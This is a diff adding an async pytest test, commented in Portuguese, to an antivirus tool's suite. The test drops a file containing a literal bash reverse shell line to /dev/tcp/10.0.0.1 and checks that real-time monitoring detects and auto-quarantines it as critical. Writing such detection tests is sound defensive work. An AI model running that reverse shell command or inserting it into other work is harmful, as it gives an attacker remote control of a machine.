@@ -218,3 +218,58 @@ class TestAutoScanWiring:
             assert detected, "auto-scan não detectou o EICAR via monitor em tempo real"
         finally:
             await engine.stop()
+
+    @pytest.mark.asyncio
+    async def test_end_to_end_simulated_reverse_shell_auto_quarantined(
+        self, tmp_path: Path
+    ) -> None:
+        """Teste intenso de invasão simulada (checklist da tarefa diária):
+        dropa um script com um reverse shell literal (inofensivo — nunca
+        executado, só o padrão de texto que um invasor real usaria) num
+        diretório monitorado de verdade e espera o pipeline completo —
+        inotify real -> auto-scan -> HeuristicEngine -> auto-quarentena —
+        reagir sozinho, sem nenhuma chamada manual a scan_file/quarantine.
+
+        Cobre o achado desta rodada (03:00 2026-08-29): antes do fix em
+        `HeuristicEngine._calculate_score` (piso de severidade) e em
+        `ScanEngine._scan_file_inner` (heurística "crítico" agora vira
+        THREAT), este cenário nunca era quarentenado automaticamente —
+        ficava só como SUSPICIOUS/"baixo" no log, mesmo sendo um indicador
+        inequívoco de reverse shell."""
+        from ekprotection.logs.models import EventType, QueryFilter
+
+        watched = tmp_path / "watch"
+        watched.mkdir()
+
+        manager = ConfigManager(tmp_path / "config.yaml")
+        manager.load()
+        manager.set("monitor.paths", [str(watched)])
+        manager.set("quarantine.auto_quarantine_critical", True)
+
+        engine = EKEngine(manager)
+        await engine.start()
+        try:
+            evil = watched / "update.sh"
+            evil.write_bytes(
+                b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
+            )
+
+            quarantined = False
+            for _ in range(50):  # até ~5s
+                await asyncio.sleep(0.1)
+                entries = engine.logs.query(QueryFilter(event_type=EventType.SCAN_MATCH))
+                match = next((e for e in entries if e.file_path == str(evil)), None)
+                if match is not None and not evil.exists():
+                    quarantined = True
+                    break
+
+            assert quarantined, (
+                "auto-scan detectou mas não quarentenou automaticamente o "
+                "reverse shell simulado via monitor em tempo real"
+            )
+            assert match.level.value == "CRITICAL"
+
+            active = engine.quarantine.list_active()
+            assert any(e.original_path == str(evil) for e in active)
+        finally:
+            await engine.stop()
